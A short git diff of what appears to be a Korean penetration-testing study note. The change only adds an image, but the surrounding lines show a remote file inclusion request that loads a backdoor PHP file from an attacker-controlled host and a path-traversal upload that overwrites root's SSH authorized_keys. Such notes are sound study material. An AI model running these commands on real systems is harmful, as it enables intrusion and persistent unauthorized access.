@@ -91,6 +91,9 @@ curl "https://example.com/index.php?page=http://192.168.119.3/simple-backdoor.ph
 `upload '../../../../../root/.ssh/authorized_keys'`  
 → SSH 공개키 덮어써서 백도어 접속 가능
 
+<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/243fbacc-c0c6-4c3c-a8b8-1ca3b665a05e" />
+
+
 ---
 
 # 💻 Command Injection
